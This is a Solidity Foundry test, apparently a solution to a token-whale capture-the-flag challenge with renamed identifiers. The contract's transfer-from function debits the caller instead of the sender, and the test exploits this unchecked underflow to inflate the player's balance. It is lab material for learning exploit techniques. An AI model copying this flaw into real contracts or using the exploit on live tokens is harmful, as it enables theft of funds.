pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract ContractTest is Test {
    KarmatokenWhaleChallenge ReputationtokenWhaleChallengeContract;

    function testCalculation() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        ReputationtokenWhaleChallengeContract = new KarmatokenWhaleChallenge();
        ReputationtokenWhaleChallengeContract.ReputationtokenWhaleDeploy(address(this));
        console.log(
            "Player balance:",
            ReputationtokenWhaleChallengeContract.standingOf(address(this))
        );
        ReputationtokenWhaleChallengeContract.sendTip(address(alice), 800);

        vm.prank(alice);
        ReputationtokenWhaleChallengeContract.allowTip(address(this), 1000);
        ReputationtokenWhaleChallengeContract.sharekarmaFrom(
            address(alice),
            address(bob),
            500
        );

        console.log("operate completed, balance calculate");
        console.log(
            "Player balance:",
            ReputationtokenWhaleChallengeContract.standingOf(address(this))
        );
    }

    receive() external payable {}
}

contract KarmatokenWhaleChallenge {
    address player;

    uint256 public allTips;
    mapping(address => uint256) public standingOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function ReputationtokenWhaleDeploy(address _player) public {
        player = _player;
        allTips = 1000;
        standingOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return standingOf[player] >= 1000000;
    }

    event GiveCredit(address indexed from, address indexed to, uint256 value);

    function _passinfluence(address to, uint256 value) internal {
        standingOf[msg.sender] -= value;
        standingOf[to] += value;

        emit GiveCredit(msg.sender, to, value);
    }

    function sendTip(address to, uint256 value) public {
        require(standingOf[msg.sender] >= value);
        require(standingOf[to] + value >= standingOf[to]);

        _passinfluence(to, value);
    }

    event Approval(
        address indexed communityLead,
        address indexed spender,
        uint256 value
    );

    function allowTip(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function sharekarmaFrom(address from, address to, uint256 value) public {
        require(standingOf[from] >= value);
        require(standingOf[to] + value >= standingOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _passinfluence(to, value);
    }
}